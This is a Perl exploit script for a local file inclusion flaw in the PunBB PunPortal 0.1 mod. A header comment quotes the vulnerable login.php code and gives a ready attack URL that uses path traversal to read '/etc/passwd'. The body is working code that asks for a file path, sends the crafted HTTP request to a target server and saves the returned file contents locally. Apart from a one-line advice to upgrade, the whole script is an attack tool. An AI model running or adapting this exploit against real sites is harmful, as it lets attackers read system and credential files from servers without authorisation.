#!/usr/bin/perl

=about

    PunBB (PunPortal 0.1) Local File Inclusion Exploit
    --------------------------------------------------
    by athos - staker[at]hotmail[dot]it
    download mod http://www.punres.org/download.php?id=1108
    download cms http://punbb.org

    register globals = 1
    magic quotes gcp = 1
    
  
    
    File (include/login.php)
    
    1. <?php
    2.
    3. // Show login if not logged in
    4. if($pun_user['is_guest'])
    5. {
    6. if(!isset($focus_element) || (isset($focus_element) && !in_array('login', $focus_element)))
    7. {
    8. 
    9. // Load the language files
    10. require PUN_ROOT.'lang/'.$pun_user['language'].'/common.php';
    11. require PUN_ROOT.'lang/'.$pun_user['language'].'/login.php';
    
    
    $pun_user['is_guest'] isn't declared
    $pun_user['language'] isn't declared
    
    include/user/login.php?pun_user[is_guest]=a&pun_user[language]=../../etc/passwd%00
    
    how to fix?use the latest version (2.0) 
     
    Usage: perl punbb.pl localhost/cms
    
=cut


use strict;
use warnings;
use IO::Socket;


my $html = undef;
my $site = $ARGV[0] or &help;
my @take = split /\//,$site;

my ($host,$path) = @take;

if($site =~ /http:\/\/(.+?)/i) {
  print STDOUT "Invalid URL\n";
  exit;
}

print STDOUT "Local File (ex: ../../etc/passwd)\n";
print STDOUT "Local File: ";
  
chomp(my $file = <STDIN>);

if(not defined($file)) {
  print STDOUT "File Not Defined!\n";
  exit;
}


my $evil = "/include/user/login.php?pun_user[is_guest]=a&pun_user[language]=";

my $sock = new IO::Socket::INET(
                                 PeerAddr => $host,
                                 PeerPort => 80,
                                 Proto    => 'tcp',
                                 Timeout  => 6,
                              ) or die $!;   

my $data = "GET /${path}/${evil}${file}%00 HTTP/1.1\r\n".
           "Host: $host\r\n".
           "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n".
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".
           "Accept-Language: en-us,en;q=0.5\r\n".
           "Accept-Encoding: gzip,deflate\r\n".
           "Connection: close\r\n\r\n";

$sock->send($data);

while(<$sock>) {
  $html .= $_;
}           

if($html =~ /(No such file or directory|HTTP\/1.1 404 Not Found)/i) {
  print STDOUT "Exploit Failed!\n";
  exit;
}
else {
  my $name = int(rand(999)).'.txt';
  
  open(FILE,">",$name);
  print FILE $html;
  close(FILE);
  
  print STDOUT "Exploit Successfully!\n";
  print STDOUT "$name saved!\n";
  exit;
}


sub help {
  print STDOUT "PunBB (PunPortal 0.1) Local File Inclusion Exploit\n".
               "by athos - staker[at]hotmail[dot]it\n".
               "Usage: perl $0 [host/path]\n";
  exit;
}

